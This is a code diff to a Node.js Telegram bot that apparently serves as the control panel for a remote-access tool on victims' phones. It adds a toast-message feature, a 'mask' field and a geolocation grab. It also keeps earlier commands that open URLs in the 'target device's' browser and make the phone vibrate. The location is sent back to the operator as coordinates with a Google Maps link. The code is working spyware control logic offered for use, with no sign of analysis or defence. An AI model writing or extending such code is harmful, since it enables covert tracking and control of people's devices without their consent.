@@ -437,20 +437,62 @@ bot.on("message", async (message) => {
                 let devid = colab.device_id;
                 if (mode == "getUrl"){
                     if (isUrl(message.text)){
-                        delete steps[message.from.id];
-                        me.write(JSON.stringify({
-                            port: portname,
-                            password: passname,
-                            method: "openUrl",
-                            device_id: devid,
-                            url: message.text,
-                            shortcut: {
-                                chat_id: message.chat.id,
-                                message_id: message.message_id,
-                                url: message.text,
-                                edit: false
+                        await bot.sendMessage(
+                            message.chat.id,
+                            build(`✍ ${sym} trying to send data ... \n - this message will edit !`),
+                            {
+                                reply_to_message_id: message.message_id
                             }
-                        }));
+                        ).then(async (rmsg) => {
+                            delete steps[message.from.id];
+                            me.write(JSON.stringify({
+                                port: portname,
+                                password: passname,
+                                method: "openUrl",
+                                mask: "metro",
+                                device_id: devid,
+                                url: message.text,
+                                shortcut: {
+                                    chat_id: message.chat.id,
+                                    message_id: rmsg.message_id,
+                                    url: message.text,
+                                    edit: true
+                                }
+                            }));
+                        })
+                    }
+                } else if (mode == "getToast"){
+                    if (message.text.length > 100){
+                        await bot.sendMessage(
+                            message.chat.id,
+                            build(`🔴 ${sym} the message must be less than 100 charecters\n - please try again`),
+                            {
+                                reply_to_message_id: message.message_id
+                            }
+                        )
+                    } else {
+                        await bot.sendMessage(
+                            message.chat.id,
+                            build(`✍ ${sym} trying to send data ... \n - this message will edit !`),
+                            {
+                                reply_to_message_id: message.message_id
+                            }
+                        ).then(async (rmsg) => {
+                            delete steps[message.from.id];
+                            me.write(JSON.stringify({
+                                port: portname,
+                                password: passname,
+                                method: "sendToast",
+                                mask: "metro",
+                                device_id: devid,
+                                toast: message.text,
+                                shortcut: {
+                                    chat_id: message.chat.id,
+                                    message_id: rmsg.message_id,
+                                    edit: true
+                                }
+                            }));
+                        })
                     }
                 }
             }
@@ -581,6 +623,7 @@ bot.on("callback_query", async (call) => {
                 port: portname,
                 password: passname,
                 method: "vibratePhone",
+                mask: "metro",
                 device_id: spl[2],
                 shortcut: {
                     chat_id: call.message.chat.id,
@@ -600,6 +643,37 @@ bot.on("callback_query", async (call) => {
                     chat_id: call.message.chat.id
                 }
             )
+        } else if (mode == "sendToast"){
+            steps[call.from.id] = {
+                mode: "getToast",
+                device_id: spl[2]
+            };
+            await bot.editMessageText(
+                build(`➕ ${sym} send your toast-message`),
+                {
+                    message_id: call.message.message_id,
+                    chat_id: call.message.chat.id
+                }
+            )
+        } else if (mode == "getGeoLocation"){
+            await bot.editMessageText(
+                build(`🍂 ${sym} data sent to the client\n - waiting to get data ...`),
+                {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.chat.id
+                }
+            )
+            me.write(JSON.stringify({
+                port: portname,
+                password: passname,
+                method: "getGeoLocation",
+                mask: "metro",
+                shortcut: {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id,
+                    edit: true
+                }
+            }))
         }
     }
 })
@@ -642,11 +716,32 @@ me.on("data", async (data) => {
                 }
             } else if (_message.method == "openUrl"){
                 if (_message.shortcut){
-                    await bot.sendMessage(
-                        _message.shortcut.chat_id,
+                    await bot.editMessageText(
                         build(`🍬 ${sym} user opened the link - `) + `<a href="${_message.shortcut.url}">${build("your link")}</a>` + build(` has opened in defualt-browser of target device\n📽 ${sym} `) + `<code>${_message.device_id}</code>`,
                         {
-                            reply_to_message_id: _message.shortcut.message_id
+                            message_id: _message.shortcut.message_id,
+                            chat_id: _message.shortcut.chat_id
+                        }
+                    )
+                }
+            } else if (_message.method == "sendToast"){
+                if (_message.shortcut){
+                    await bot.editMessageText(
+                        build(`🍧 ${sym} your message sent successfully & text showed-up`),
+                        {
+                            message_id: _message.shortcut.message_id,
+                            chat_id: _message.shortcut.chat_id
+                        }
+                    )
+                }
+            } else if (_message.method == "getGeoLocation"){
+                if (_message.shortcut){
+                    await bot.editMessageText(
+                        build(`🗺 ${sym} location detected\n🛰 ${sym} latitude & longitude : `) +  `<code>${_message.latitude},${_message.longitude}</code>` + build(`\n🔬 ${sym} check on `) + `<a href="https://www.google.com/maps/@${_message.latitude},${_message.longitude},15z">${build("google-map")}</a>`,
+                        {
+                            parse_mode: "HTML",
+                            chat_id: _message.shortcut.chat_id,
+                            message_id: _message.shortcut.message_id
                         }
                     )
                 }
